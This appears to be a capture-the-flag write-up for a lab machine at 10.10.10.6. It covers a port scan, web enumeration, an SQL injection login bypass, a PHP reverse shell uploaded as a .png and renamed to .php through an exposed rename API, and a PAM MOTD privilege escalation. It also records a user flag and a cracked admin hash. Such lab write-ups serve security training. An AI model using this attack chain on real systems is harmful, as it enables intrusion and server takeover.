### Ports scan
```text
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIAn8zzHM1eVS/OaLgV6dgOKaT+kyvjU0pMUqZJ3AgvyOrxHa2m+ydNk8cixF9lP3Z8gLwquTxJDuNJ05xnz9/DzZClqfNfiqrZRACYXsquSAab512kkl+X6CexJYcDVK4qyuXRSEgp4OFY956Aa3CCL7TfZxn+N57WrsBoTEb9PAAAAFQDMosEYukWOzwL00PlxxLC+lBadWQAAAIAhp9/JSROW1jeMX4hCS6Q/M8D1UJYyat9aXoHKg8612mSo/OH8Ht9ULA2vrt06lxoC3O8/1pVD8oztKdJgfQlWW5fLujQajJ+nGVrwGvCRkNjcI0Sfu5zKow+mOG4irtAmAXwPoO5IQJmP0WOgkr+3x8nWazHymoQlCUPBMlDPvgAAAIBmZAfIvcEQmRo8Ef1RaM8vW6FHXFtKFKFWkSJ42XTl3opaSsLaJrgvpimA+wc4bZbrFc4YGsPc+kZbvXN3iPUvQqEldak3yUZRRL3hkF3g3iWjmkpMG/fxNgyJhyDy5tkNRthJWWZoSzxS7sJyPCn6HzYvZ+lKxPNODL+TROLkmQ==
|   2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==
80/tcp open  http    syn-ack Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enum
```text
http://10.10.10.6/test.php -> phpinfo page

http://10.10.10.6/torrent/ -> torrent hoster

http://10.10.10.6/rename/
	-> Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
	-> can be used to rename file
```

### Exploitation
```bash
# authencation bypass on http://10.10.10.6/torrent/
acc: "' or 1=1; #"
pwd: "whatever"

# upload php revershell in png format
php-reverse-shell.php.png

# screenshot upload folder
http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png

# change the file extension by the rename API
http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png&newfilename=/var/www/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php

# trigger reverse shell by browsing url
http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php

# user.txt
4efe74999d42c95ba1d725e7d8bbdf36

```

### Priv Esc
```bash\
# found admin hash on /var/www/torrent/database/th_database.sql
1844156d4166d94387f1a4ad031ca5fa:admin12

# found exploit based on the obtained file (/home/george/.cache/motd.legal-displayed)
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)

# run script then get a root shell
```
